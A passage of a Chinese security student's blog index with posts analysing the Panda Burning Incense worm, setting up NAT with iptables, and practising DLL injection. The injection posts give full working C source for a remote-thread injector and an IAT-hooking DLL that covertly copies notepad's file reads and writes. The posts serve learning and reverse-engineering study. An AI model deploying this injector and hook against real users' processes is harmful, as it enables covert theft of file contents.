20191108151619","categories":[{"name":"网络安全","slug":"网络安全","permalink":"https://liuyi12138.github.io/categories/网络安全/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"https://liuyi12138.github.io/tags/逆向/"},{"name":"病毒","slug":"病毒","permalink":"https://liuyi12138.github.io/tags/病毒/"}]},{"title":"熊猫烧香源码分析","slug":"熊猫烧香源码分析","date":"2019-11-02T03:07:23.000Z","updated":"2021-02-23T06:34:31.925Z","comments":true,"path":"2019/11/02/熊猫烧香源码分析/","link":"","permalink":"https://liuyi12138.github.io/2019/11/02/熊猫烧香源码分析/","excerpt":"网安组熊猫烧香病毒分析","text":"网安组熊猫烧香病毒分析 整体结构分析 20191106163334 根据IDA逆向出的流程图可知熊猫烧香病毒逆向后大致分为主流程以及三个调用的函数 主流程分析 在主流程中进行了两次字符串校验来判断病毒是否正常执行 字符串校验是将两个已有的字符串进过一个函数处理后与另一个字符串比较，若相同则继续进行后续操作，不同则退出程序。作用类似于哈希校验，防止其他人篡改程序 三个调用函数整体分析 https://www.52pojie.cn 主模块一源码分析主模块一的主要任务是判断运行的软件类型，根据不同的软件类型进行不同的操作 软件类型分类有: panda.exe，熊猫烧香源文件，若运行的是此文件则将其复制到C:\\Windows\\system32\\drivers\\spcolsv.exe并开启一个新的进程运行之 spcolsv.exe，复制后的文件，若运行的是此文件则进入到主模块二 被感染的文件.在主模块二中会有感染过程的分析，若运行的是被感染的文件则删除感染标识，从感染的文件中将感染前的文件释放，命名为xxx.exe.exe，并生成bat脚本，当用户运行xxx.exe.exe则自动删除其自身和被感染文件 20191107094942 自拷贝spcolsv.exe并运行 20191107095713 如图可看出在自拷贝函数中用的最多的API是LstrCatN(字符串拼接函数)，通过动调分析可知该函数拼接了panda.exe和spcolsv.exe的绝对地址 自拷贝函数中最主要的两个API为CopyFileA和WinExec，通过这两个API可以基本确定此函数的功能为拷贝文件并新建线程运行 创建bat文件自删除 20191107105953 该函数创建了一个bat文件并执行之 某bat文件内容如下 20191107110302 该bat将被感染的文件删除，并将被释放出的原文件改名，运行，删除。即在用户看来，被感染的文件运行一次后会自删除 主模块二源码分析主模块二的主要任务是新建一个线程来感染电脑中的其他文件，并在局域网中进行传播 其主要流程如下： 20191107162028 获取电脑正在使用的盘符 20191107112039 获取到正在使用的盘符后都拼接到一个字符串中，通过获取字符串的长度来获取正在使用的盘符数量 判断盘符数量，若小于1则陷入死循环，若大于1则依次判断是否存在A盘和B盘，若存在该字符串头指针++，继续判断盘符数量，最终目的即是让字符串头指指向”C” 若C盘存在对其进行感染，其实如果电脑不存在C盘，第三个盘是其他盘该函数也会进入并感染之，不过一般windows的系统盘符一般都是C 遍历C盘，感染指定类型的文件此函数中主要感染的文件类型有exe、scr、pif、com，以及htm、html、asp、php、jsp对于这两种文件的处理方式不同 函数感染的主题流程如下，左侧为文件感染流程，主要是对不同类型的文件有不同的处理方式，右侧为文件夹遍历流程，主要是会过滤掉一些文件夹不做感染 20191107154208 文件夹过滤 文件夹方面处理主要是获取当前目录名称，并与需要过滤的文件夹名称进行对比，相同则结束该函数 20191107154547 exe scr pif com文件感染 对于这四种文件采用的是同一个函数进行感染 20191107154615 该函数主要作用是复制，将被感染问价处理为如下格式 20191107154856 htm、html、asp、php、jsp文件感染 该部分主要在文件末尾追加一个网址 20191107155228 删除GHO系统备份文件 GHO文件即为ghost的镜像文件,可通过OneKey进行还原和备份,也可直接通过光盘优化启动,进入ghost11进行一键还原 在感染函数的开头就删除了GHO系统备份文件 20191107155554 ini配置文件 20191107160756 设置定时器在磁盘根目录生成文件 该函数主要生成setup.exe和autorun.inf两个文件 20191107162348 Autorun.inf是电脑使用中比较常见的文件之一 ，其作用是允许在双击磁盘时自动运行指定的某个文件 该函数将正在运行的程序自身拷贝到setup.exe,并写入Autorun.inf使得用户双击C盘时自动运行该病毒 20191107162740 局域网感染 该函数创建线程尝试连接139和445两个端口，通过共享内存的方式来感染局域网中的其他机器 20191107161157 主模块三源码分析 主模块三创建了四个定时器，分别用来结束杀软，解密url 下载并运行，删除共享，停止并删除杀软服务 20191107163119 结束杀软 该定时器主要是关闭一些杀毒软件的进程以及创建并设置注册表键值(自启动以及不显示隐藏文件) 关闭杀软进程 关闭杀软是通过POSTMESSAGE的方式来完成的 20191107163818 主要关闭了以下杀软 20191107164040 创建并设置注册表键值 主要调用的API为RegCreateKeyExA(创建注册表)和RegSetValueExA(设置键值) 解密url 下载并运行 该定时器主要调用的API为RLDownloadToFileA(下载url)，WinExec(创建线程并运行) 20191107164459 删除共享 该定时器使用了net share命令来停止C盘的共享 20191107164717 停止并删除杀软服务 该定时器主要调用CloseServiceHandle和DeleteService两个API来停止并删除杀软服务 20191107165432 至此整个熊猫烧香的逆向工程已经分析完了，结合上一篇熊猫烧香行为分析我们大致可以了解熊猫烧香的行为以及工作原理，在后期我们可能需要想办法去防御这种病毒的攻击，逆向才刚刚入门，冲冲冲！","categories":[{"name":"网络安全","slug":"网络安全","permalink":"https://liuyi12138.github.io/categories/网络安全/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"https://liuyi12138.github.io/tags/逆向/"},{"name":"病毒","slug":"病毒","permalink":"https://liuyi12138.github.io/tags/病毒/"}]},{"title":"熊猫烧香行为分析","slug":"熊猫烧香行为分析","date":"2019-10-31T12:18:36.000Z","updated":"2021-02-23T06:34:31.925Z","comments":true,"path":"2019/10/31/熊猫烧香行为分析/","link":"","permalink":"https://liuyi12138.github.io/2019/10/31/熊猫烧香行为分析/","excerpt":"网安组熊猫烧香病毒分析","text":"网安组熊猫烧香病毒分析 使用PEID进行查壳和语言分析 该病毒无壳，可继续进行分析 该病毒子系统为Win32 GUI 猜测可能有图形界面 该病毒使用的语言为Borland Delphi 6.0 - 7.0，在静态调试时可加载相对应的签名 使用LordPE分析panda.vir文件头 主要分析该执行文件的资源目录和导入导出表 发现资源目录下为一些字符串声明和图片 导出表中没有数据 从导入表中整理出的调用的API接口如下123456789101112131415161718192021222324252627282930313233文件操作:CreateFileADeleteFileACopyFileA //病毒可能进行自我拷贝WriteFileReadFileFindNextFileA //病毒在感染的过程中可能会遍历文件夹网络操作:socketconnectclosesocketInternetReadFileInternetOpenUrlAURLDownloadToFileA //病毒会进行联网下载进程与线程操作://病毒涉及到进程与线程的操作GetCurrentThreadIdGetThreadLocaleCreateThread注册表操作://病毒会对注册表进行增删改查RegSetValueExARegOpenKeyExARegDeleteValueARegCreateKeyExA其他操作://病毒可能调用计时器来进行某些操作GetLocalTimeSetTimer 使用IDR获取敏感字符串信息 部分敏感字符串整理如下123456789' 感染过,跳过!' //验证了之前的猜想，该病毒的确进行了文件夹扫描进行感染'\\\\Desktop_.ini 没有找到,建立一个!' //该病毒会在桌面新建Desktop_.ini文件，暂时不知道用处'fuckyou' //病毒作者很是暴躁'***武*汉*男*生*感*染*下*载*者***' //病毒作者是武汉人'防火墙' '杀毒' '杀毒' '瑞星' //该病毒对防火墙和一些杀毒软件进行了操作 使用火绒剑模拟运行执行监控 进行了进程启动和模块加载 文件监控 似乎在所有的文件夹下都新建了一个Desktop_.ini 修改了很多文件的属性 注册表监控 不用想肯定是修改了很多注册表项以及自己 进程监控 主要动作为打开设备和查看窗口以及枚举进程 网络监控 发现该病毒对局域网内139和445的很多端口都进行了网络连接 查看资料后发现139和445端口用于局域网内共享文件，可以判断是该病毒在尝试在局域网内传播 行为监控 火绒剑自动识别出了一些行为，可能已经包含了上述几个方面的内容 病毒感染了C盘中的很多exe文件 病毒对感染的文件进行覆写，将自己复制到这些可执行文件中 病毒大量修改了注册表 病毒释放了所有的Desktop_.ini隐藏文件使其可见(但发现还是看不到啊) 重新查看文件监控中的修改文件属性，发现每隔一段时间(呼应之前看到的计时器)都会修改一次Desktop_.ini的文件属性，猜测是又将其改成不可见 观察病毒的行为 熊猫烧香将所有的exe文件覆写为它本身，当你执行一次后会生成一个xxx.exe.exe文件，再执行一次这个文件后两个exe文都会被删除，不给人一点分析的机会，有点狠 至此我们大致分析了熊猫烧香的行为，下一阶段即是对熊猫烧香的源码进行细致的分析","categories":[{"name":"网络安全","slug":"网络安全","permalink":"https://liuyi12138.github.io/categories/网络安全/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"https://liuyi12138.github.io/tags/逆向/"},{"name":"病毒","slug":"病毒","permalink":"https://liuyi12138.github.io/tags/病毒/"}]},{"title":"vmware搭建小型局域网","slug":"vmware搭建小型局域网","date":"2019-10-29T11:21:36.000Z","updated":"2021-02-23T06:34:31.925Z","comments":true,"path":"2019/10/29/vmware搭建小型局域网/","link":"","permalink":"https://liuyi12138.github.io/2019/10/29/vmware搭建小型局域网/","excerpt":"网安组计网培训任务","text":"网安组计网培训任务 任务要求 通过VMware为虚拟机添加网卡，并给虚拟机配置静态IP、网关和路由(iproute2/net-tools工具配置，或使用配置文件配置)。使得B和C能互ping，且能ping通A 使用iptables实现NAT转换，使得B和C能够访问(ping)A的网关和公网 20191029192157 知识整理iptables 可参考朱双印个人日志|iptables详解(一): 基本概念 iptables相当于一个客户端代理，用户通过iptables将安全设定执行安全框架(netfilter)中 netfilter位于内核空间，用户通过操作位于用户空间的iptables来控制netfilter netfilter/iptables组成Linux平台下的包过滤防火墙 任务实现静态ip配置 修改/etc/sysconfig/network-scripts/中的网卡配置为静态ip，并设置好ip地址、掩码和网关 需要注意的问题是需要修改vmware的虚拟网络编辑器中的子网ip，否则系统会先依据虚拟网络编辑器中的ip配置 路由配置 修改/etc/sysctl.conf中的net.ipv4.ip_forward=1，开启路由转发 sysctl -p重新加载配置文件 iptables -F关闭防火墙 tcpdump抓包 由于BC两虚拟机未联网，对虚拟机A的IP2网卡使用tcpdump进行抓包分析 tcpdump -i ens34 host 10.1.2.100 使用虚拟机C(10.1.2.101) ping 虚拟机B(10.1.2.100) 由图可见10.1.2.101和10.1.2.100有来有回，是可以互相ping通的 20191030094208 tcpdump -i ens34 host 8.8.8.8 使用虚拟机C(10.1.2.101) ping 8.8.8.8 由图可见虚拟机C暂时还无法ping通google的服务，还需要配置iptables 20191030094643 iptables配置 可参考朱双印个人日志|iptables详解(十三): NAT iptables -t nat -A POSTROUTING -s 10.1.2.0/24 -j SNAT --to-source 192.168.188.128 -t nat表示操作nat表 -A POSTROUTING表示将SNAT规则添加到POSTROUTING链尾 -s 10.1.2.0/24表示匹配的报文来自10.1.2.0/24 -j SNAT表示使用SNAT动作，对报文进行地址转换 --to-source 192.168.188.128表示将匹配到的报文源修改为192.168.188.128 tcpdump抓包验证 20191030154436","categories":[{"name":"网络安全","slug":"网络安全","permalink":"https://liuyi12138.github.io/categories/网络安全/"}],"tags":[{"name":"计网","slug":"计网","permalink":"https://liuyi12138.github.io/tags/计网/"}]},{"title":"DLL注入实践","slug":"DLL注入实践","date":"2019-10-23T09:15:36.000Z","updated":"2021-02-23T06:34:31.910Z","comments":true,"path":"2019/10/23/DLL注入实践/","link":"","permalink":"https://liuyi12138.github.io/2019/10/23/DLL注入实践/","excerpt":"网安组新人任务Week3实践内容","text":"网安组新人任务Week3实践内容 实践任务 使用C编写一段代码,使用Dll注入的方法, 窃取你的系统中的32位notepad.exe(记事本)的保存和读取的文件内容 具体要求 打开注入器, 它能够自动寻找notepad.exe进程,发现一个记事本进程之后将恶意Dll注入该进程中 该进程进行了文件读写之后, Dll将内容窃取(但不拦截), 并交给注入器, 注入器将相关内容输出在控制台中 需要编写两份代码,一份为Dll(被注入的代码),一份为Dll注入器(也作为主控, 输出得到的信息)推荐远程线程注入的方法注入DLL! 实践思路Dll注入器 DLL注入部分在上一篇博客DLL注入实现 利用Windows的API可以实现根据进程名称自动获取进程PID 进程间的通信采用共享内存的方式实现 Dll文件 注入DLL后采用IAT钩取的方式将IAT中WriteFile()和ReadFile函数的RVA替换成自己构建的函数地址，由此可在系统调用文件读写函数的时候获取到用户进行文件读写的信息 WriteFile()和ReadFile函数在”kernel32.dll”中，但我的win10上的notepad.exe导入表中并没有”kernel32.dll”，猜测是win10防止攻击的一种措施,所以我在虚拟机中运行此程序 除了IAT钩取使用调试器的方式也能完成此实践，两种方法可分别参考博客[dll注入实现IAT勾取] 计算器显示中文和[记事本API Hook] 调试器 勾取 WriteFile()Api 代码编写 DLL注入程序InjectDll 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#include &lt;Tlhelp32.h&gt;BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnable);BOOL InjectDll(DWORD dwPID, LPCTSTR szDllPath);DWORD ProcessNameToPID(char* Name);#define BUF_SIZE 4096int main(int argc, char* argv[])&#123; if(argc != 3)&#123; printf(\"input error, Usage: %s &lt;pid&gt; &lt;dll_path&gt;\", argv[0]); return 1; &#125; DWORD pid = ProcessNameToPID(argv[1]); printf(\"PID: %d\\n\", pid); //change privilege if(!SetPrivilege(SE_DEBUG_NAME, true)) return 1; char szBuffer[BUF_SIZE] = &#123;0&#125;; char szBufferLast[BUF_SIZE] = &#123;0&#125;; //inject dll while(1)&#123; pid = ProcessNameToPID(argv[1]); if(pid != 0 &amp;&amp; InjectDll((DWORD)pid, (LPCTSTR)argv[2]))&#123; printf(\"InjectDll(\\\"%s\\\") success!!!\\n\", argv[2]); // 定义共享数据 // 创建共享文件句柄 HANDLE hMapFile = CreateFileMapping( INVALID_HANDLE_VALUE, // 物理文件句柄 NULL, // 默认安全级别 PAGE_READWRITE, // 可读可写 0, // 高位文件大小 BUF_SIZE, // 地位文件大小 \"myhack\" // 共享内存名称 ); // 映射缓存区视图 , 得到指向共享内存的指针 LPVOID lpBase = MapViewOfFile( hMapFile, // 共享内存的句柄 FILE_MAP_ALL_ACCESS, // 可读写许可 0, 0, BUF_SIZE ); while(1)&#123; //缓存上一次的数据 strcpy(szBufferLast,szBuffer); // 将共享内存数据拷贝出来 strcpy(szBuffer,(char*)lpBase); if(strcmp(szBuffer, szBufferLast))&#123; printf(\"%s\",szBuffer); &#125; Sleep(200); &#125; &#125; else&#123; printf(\"Waiting for (\\\"%s\\\")\\n\", argv[1]); &#125; Sleep(200); &#125; return 0;&#125;BOOL InjectDll(DWORD dwPID, LPCTSTR szDllPath)&#123; HANDLE hProcess = NULL, hThread = NULL; HMODULE hMod = NULL; LPVOID pRemoteBuf = NULL; DWORD dwBufSize = (DWORD)(strlen(szDllPath) + 1) * sizeof(char); LPTHREAD_START_ROUTINE pThreadProc; //获取目标进程句柄，获取PROCESS_ALL_ACCESS权限 if(!(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)) ) &#123; //printf(\"OpenProcess(%d) failed!!! [%d]\\n\", dwPID, GetLastError()); return FALSE; &#125; //将注入的DLL路径写入目标进程内存 //在指定进程的虚拟空间保留或提交内存区域 pRemoteBuf = VirtualAllocEx(hProcess, NULL, dwBufSize, MEM_COMMIT, PAGE_READWRITE); WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllPath, dwBufSize, NULL); hMod = GetModuleHandle(\"kernel32.dll\"); pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hMod, \"LoadLibraryA\"); //创建远程线程 hThread = CreateRemoteThread(hProcess, NULL, 0, pThreadProc, pRemoteBuf, 0, NULL); WaitForSingleObject(hThread, INFINITE); CloseHandle(hThread); CloseHandle(hProcess); return true;&#125;BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnable) &#123; OutputDebugString(lpszPrivilege); BOOL bRet = FALSE; HANDLE hToken = NULL; HANDLE hProcess = ::OpenProcess(PROCESS_ALL_ACCESS, FALSE, ::GetCurrentProcessId()); if (!::OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES, &amp;hToken)) &#123; goto __EXIT; &#125; LUID Luid; if (!::LookupPrivilegeValue(NULL, lpszPrivilege, &amp;Luid)) &#123; goto __EXIT; &#125; TOKEN_PRIVILEGES newPrivilege; newPrivilege.PrivilegeCount = 1; newPrivilege.Privileges[0].Luid = Luid; newPrivilege.Privileges[0].Attributes = //设置特权属性 bEnable ? SE_PRIVILEGE_ENABLED : SE_PRIVILEGE_ENABLED_BY_DEFAULT; if (!::AdjustTokenPrivileges(hToken, FALSE, &amp;newPrivilege, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) &#123; TCHAR s[64] = &#123; 0 &#125;; //printf(\"AdjustTokenPrivileges error: %d\\n\",GetLastError()); OutputDebugString(s); goto __EXIT; &#125; if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)//查看是否真的设置成功了 &#123; printf(\"The token does not have the specified privilege. \\n\"); goto __EXIT; &#125; bRet = TRUE; printf(\"Set OK\\n\");__EXIT: if (hProcess) &#123; ::CloseHandle(hProcess); &#125; if (hToken) &#123; ::CloseHandle(hToken); &#125; return bRet;&#125;DWORD ProcessNameToPID(char* Name)&#123; HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0); if(hSnapshot == INVALID_HANDLE_VALUE)&#123; printf(\"Create Snapshot failed\"); return 1; &#125; PROCESSENTRY32 pi; pi.dwSize = sizeof(PROCESSENTRY32); BOOL bRet = Process32First(hSnapshot,&amp;pi); while(bRet)&#123; if(strcmp(pi.szExeFile, Name) == 0)&#123; return pi.th32ProcessID; &#125; else&#123; bRet = Process32Next(hSnapshot,&amp;pi); &#125; &#125; return 0;&#125; DLL程序myhack 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159#include \"windows.h\"#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;tlhelp32.h&gt;BOOL HookIAT(LPCSTR szDllName, PROC pfnOrg, PROC pfnNew);BOOL WINAPI HookedReadFile( HANDLE hFile, //文件的句柄 LPVOID lpBuffer, //用于保存读入数据的一个缓冲区 DWORD nNumberOfBytesToRead, //要读入的字节数 LPDWORD lpNumberOfBytesRead, //指向实际读取字节数的指针 LPOVERLAPPED lpOverlapped);BOOL WINAPI HookedWriteFile(HANDLE hFile,//文件句柄LPCVOID lpBuffer,//数据缓存区指针DWORD nNumberOfBytesToWrite,//要写的字节数LPDWORD lpNumberOfBytesWritten,//用于保存实际写入字节数的存储区域的指针LPOVERLAPPED lpOverlapped//OVERLAPPED结构体指针);typedef BOOL (WINAPI *PFSETWINDOWTEXTW)(HWND hWnd, LPWSTR lpString);#define BUF_SIZE 4096LPVOID g_readProc = NULL;LPVOID g_writeProc = NULL;BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)&#123; switch( fdwReason ) &#123; case DLL_PROCESS_ATTACH : g_readProc = (LPVOID)GetProcAddress(GetModuleHandleA(\"kernel32.dll\"), \"ReadFile\"); g_writeProc = (LPVOID)GetProcAddress(GetModuleHandleA(\"kernel32.dll\"), \"WriteFile\"); if (g_readProc) &#123; HookIAT(\"kernel32.dll\", (PROC)g_readProc, (PROC)HookedReadFile); HookIAT(\"kernel32.dll\", (PROC)g_writeProc, (PROC)HookedWriteFile); &#125; break; case DLL_PROCESS_DETACH: //HookIAT(\"kernel32.dll\", (PROC)HookedReadFile, (PROC)g_readProc); //HookIAT(\"kernel32.dll\", (PROC)HookedWriteFile, g_writeProc); break; &#125; return TRUE;&#125;BOOL WINAPI HookedReadFile( HANDLE hFile, //文件的句柄 LPVOID lpBuffer, //用于保存读入数据的一个缓冲区 DWORD nNumberOfBytesToRead, //要读入的字节数 LPDWORD lpNumberOfBytesRead, //指向实际读取字节数的指针 LPOVERLAPPED lpOverlapped)&#123; int status = ReadFile(hFile, lpBuffer, nNumberOfBytesToRead, lpNumberOfBytesRead, lpOverlapped); HANDLE hMapFile = OpenFileMapping(FILE_MAP_ALL_ACCESS,NULL,\"myhack\"); if(hMapFile)&#123; LPVOID lpBase = MapViewOfFile(hMapFile,FILE_MAP_ALL_ACCESS,0,0,0); char szBuffer[BUF_SIZE] = \"ReadFile: \"; strncat(szBuffer, (char*)lpBuffer, (*lpNumberOfBytesRead)); strcat(szBuffer, \"\\n\"); //写入数据 strcpy((char*)lpBase,szBuffer); // 解除文件映射 UnmapViewOfFile(lpBase); // 关闭内存映射文件对象句柄 CloseHandle(hMapFile); &#125; return status;&#125;BOOL WINAPI HookedWriteFile( HANDLE hFile,//文件句柄 LPCVOID lpBuffer,//数据缓存区指针 DWORD nNumberOfBytesToWrite,//要写的字节数 LPDWORD lpNumberOfBytesWritten,//用于保存实际写入字节数的存储区域的指针 LPOVERLAPPED lpOverlapped//OVERLAPPED结构体指针) &#123; HANDLE hMapFile = OpenFileMapping(FILE_MAP_ALL_ACCESS,NULL,\"myhack\"); if(hMapFile)&#123; LPVOID lpBase = MapViewOfFile(hMapFile,FILE_MAP_ALL_ACCESS,0,0,0); char szBuffer[BUF_SIZE] = \"WriteFile: \"; strncat(szBuffer, (char*)lpBuffer, nNumberOfBytesToWrite); strcat(szBuffer, \"\\n\"); //写入数据 strcpy((char*)lpBase,szBuffer); // 解除文件映射 UnmapViewOfFile(lpBase); // 关闭内存映射文件对象句柄 CloseHandle(hMapFile); &#125; return WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped);&#125;// 负责iat的勾取BOOL HookIAT(LPCSTR szDllName, PROC pfnOrg, PROC pfnNew)&#123; HMODULE hMod; LPCSTR szLibName; PIMAGE_IMPORT_DESCRIPTOR pImportDesc; PIMAGE_THUNK_DATA pThunk; DWORD dwOldProtect, dwRVA; PBYTE pAddr; //*首先进行PE文件头信息的读取*/ // hMod, pAddr = ImageBase of notepad.exe // = VA to MZ signature (IMAGE_DOS_HEADER) hMod = GetModuleHandle(NULL); pAddr = (PBYTE)hMod; // pAddr = VA to PE signature (IMAGE_NT_HEADERS) pAddr += *((DWORD*)&amp;pAddr[0x3C]); // dwRVA = RVA to IMAGE_IMPORT_DESCRIPTOR Table dwRVA = *((DWORD*)&amp;pAddr[0x80]); // pImportDesc = VA to IMAGE_IMPORT_DESCRIPTOR Table 如果想要找到IAT首先要找到导入表对应的位置 pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)hMod+dwRVA); /*通过循环来比较找到kernel32.dll中的导入表结构*/ for( ; pImportDesc-&gt;Name; pImportDesc++ ) &#123; // szLibName = VA to IMAGE_IMPORT_DESCRIPTOR.Name szLibName = (LPCSTR)((DWORD)hMod + pImportDesc-&gt;Name); if( !_stricmp(szLibName, szDllName) ) &#123; // pThunk = IMAGE_IMPORT_DESCRIPTOR.FirstThunk // = VA to IAT(Import Address Table) pThunk = (PIMAGE_THUNK_DATA)((DWORD)hMod + pImportDesc-&gt;FirstThunk); // pThunk-&gt;u1.Function = VA to API for( ; pThunk-&gt;u1.Function; pThunk++ ) &#123; if( pThunk-&gt;u1.Function == (DWORD)pfnOrg ) &#123; // 更改内存属性为E/R/W //由于计算器原有IAT内存区域是只可读的 //所以勾取之前通过VirtualProtect函数将相应的IAT的内存区域更改为可读写模式 bool a = VirtualProtect((LPVOID)&amp;pThunk-&gt;u1.Function, // 目标地址起始位置 4, // 大小 PAGE_EXECUTE_READWRITE, // 请求的保护方式 区域包含可执行代码，应用程序可以读写该区域。 &amp;dwOldProtect); // 保存老的保护方式 //修改IAT值（勾取）把原有指向user32.dll/Setwindowtext的值指向我们自己的函数MySetWindowTextW pThunk-&gt;u1.Function = (DWORD)pfnNew; // 恢复内存属性 VirtualProtect((LPVOID)&amp;pThunk-&gt;u1.Function, 4, dwOldProtect, &amp;dwOldProtect); return TRUE; &#125; &#125; &#125; &#125; return FALSE;&#125; 实践效果 运行该程序需要用管理员身份运行，否则会提权失败 20191028164535","categories":[{"name":"网络安全","slug":"网络安全","permalink":"https://liuyi12138.github.io/categories/网络安全/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"https://liuyi12138.github.io/tags/逆向/"},{"name":"DLL","slug":"DLL","permalink":"https://liuyi12138.github.io/tags/DLL/"}]},{"title":"DLL注入","slug":"DLL注入","date":"2019-10-21T02:46:36.000Z","updated":"2021-02-23T06:34:31.910Z","comments":true,"path":"2019/10/21/DLL注入/","link":"","permalink":"https://liuyi12138.github.io/2019/10/21/DLL注入/","excerpt":"网安组新人任务Week3笔记","text":"网安组新人任务Week3笔记 DLL注入简介 DLL注入指的是向运行中的其他进程强制插入特定的DLL文件 从技术细节上来讲，DLL注入命令其他进程自行调用LoadLibrary() API，加载用户指定的DLL文件 DLL注入主要使用以下三种方法: 创建远程线程(CreateRemoteThread()) 使用注册表(AppInit_DLLs值) 消息钩取(SetWindowsHookEx()) 创建远程线程主要思路 使用进程PID打开进程,获得句柄 使用进程句柄申请内存空间 把dll路径写入内存 创建远程线程,调用LoadLibrary 释放收尾工作或者卸载dll 参考文档代码实现1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071BOOL InjectDll(DWORD dwPID, LPCTSTR szDllPath)&#123; HANDLE hProcess = NULL, hThread = NULL; HMODULE hMod = NULL; LPVOID pRemoteBuf = NULL; DWORD dwBufSize = (DWORD)(strlen(szDllPath) + 1) * sizeof(char); LPTHREAD_START_ROUTINE pThreadProc; printf(\"获取目标进程句柄\\n\"); //获取目标进程句柄，获取PROCESS_ALL_ACCESS权限 if(!(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)) ) &#123; printf(\"OpenProcess(%d) failed!!! [%d]\\n\", dwPID, GetLastError()); return FALSE; &#125; //将注入的DLL路径写入目标进程内存 /* //在指定进程的虚拟空间保留或提交内存区域 LPVOID WINAPI VirtualAllocEx( __in HANDLE hProcess, //进程句柄 __in_opt LPVOID lpAddress, //地址，为NULL自动找一个合适的地址 __in SIZE_T dwSize, //内存块大小，单位为字节 __in DWORD flAllocationType, //分配类型，预定或调拨 __in DWORD flProtect //保护属性 ); */ printf(\"将注入的DLL路径写入目标进程内存\\n\"); //在指定进程的虚拟空间保留或提交内存区域 pRemoteBuf = VirtualAllocEx(hProcess, NULL, dwBufSize, MEM_COMMIT, PAGE_READWRITE); /* BOOL WINAPI WriteProcessMemory( __in HANDLE hProcess, //进程句柄 __in LPVOID lpBaseAddress, //写入地址 __in LPCVOID lpBuffer, //源缓冲区 __in SIZE_T nSize, //缓冲区大小，单位为字节 __out SIZE_T *lpNumberOfBytesWritten //实际写入的字节数 ); */ WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllPath, dwBufSize, NULL); //获取LoadLibraryA()的API地址 //在Windows系统中kernel32.dll在每个进程中的加载地址是相同的 printf(\"获取LoadLibraryW()的API地址\\n\"); //创建远程线程 主要目的是调用LoadLibrary /* HANDLE hThread = CreateRemoteThread( __in HANDLE hProcess, //目标进程句柄 __in_opt LPSECURITY_ATTRIBUTES lpThreadAttributes, //表示线程内核对象的安全属性，一般传入NULL表示使用默认设置 __in SIZE_T dwStackSize, //表示线程栈空间大小。传入0表示使用默认大小（1MB） __in LPTHREAD_START_ROUTINE lpStartAddress, //表示新线程所执行的线程函数地址，多个线程可以使用同一个函数地址 __in_opt LPVOID lpParameter, //线程函数参数 __in DWORD dwCreationFlags, //指定额外的标志来控制线程的创建，为0表示线程创建之后立即就可以进行调度， 如果为CREATE_SUSPENDED则表示线程创建后暂停运行，这样它就无法调度，直到调用ResumeThread() __out_opt LPDWORD lpThreadId //将返回线程的ID号，传入NULL表示不需要返回该线程ID号 ) */ //由于LoadLibrary是个宏，而非实际的函数，因此需要使用GetProcAddress并传入LoadLibraryW 或 LoadLibraryA来获取真实地址 hMod = GetModuleHandle(\"kernel32.dll\"); pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hMod, \"LoadLibraryA\"); //创建远程线程 printf(\"创建远程线程\\n\"); hThread = CreateRemoteThread(hProcess, NULL, 0, pThreadProc, pRemoteBuf, 0, NULL); WaitForSingleObject(hThread, INFINITE); CloseHandle(hThread); CloseHandle(hProcess); return true;&#125; 使用注册表 在注册表编辑器中将要注入的DLL路径写入到AppInit_DLLs项目中，将LoadAppIait_DLLs的项目值置为1，重启后，指定DLL会注入所有运行进程 User32.dll被加载到进程时，会读取AppInit_DLLs注册表，若有值则调用LoadLibrery()加载用户DLL 消息钩取 用SetWindowsHookEx()安装好消息“钩子”，然后由OS将指定DLL强制追响应进程","categories":[{"name":"网络安全","slug":"网络安全","permalink":"https://liuyi12138.github.io/categories/网络安全/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"https://liuyi12138.github.io/tags/逆向/"},{"name":"DLL","slug":"DLL","permalink":"https://liuyi12138.github.io/tags/DLL/"}]},{"title":"重定位表","slug":"重定位表","date":"2019-10-21T01:05:36.000Z","updated":"2021-02-23T06:34:31.941Z","comments":true,"path":"2019/10/21/重定位表/","link":"","permalink":"https://liuyi12138.github.io/2019/10/21/重定位表/","excerpt":"网安组新人任务Week2笔记","text":"网安组新人任务Week2笔记 代码重定位 代码重定位是吧可执行代码从内存的一个地方移动到另一个地方去，保证该部分代码还能正常执行的一项技术 代码重定位的关键解决方法是使用相对地址来代替绝对地址,用寄存器访问代替全局变量的访问 PE文件头中的重定位表PE重定位是为了便于PE加载程序时修正代码中使用的绝对地址，保证程序在不同地址空间上运行的兼容性 当装载时IMAGE_OPTIONAL_HEADER32.ImageBAse(程序装载基地址)位置已经被占用时，操作系统会重新选择另一个基地址，这是就需要根据PE中的重定位表对所有的重定位信息进行修正 重定位表位于数据目录的第6个目录项 重定位表项IMAGE_BASE_RELOCATION 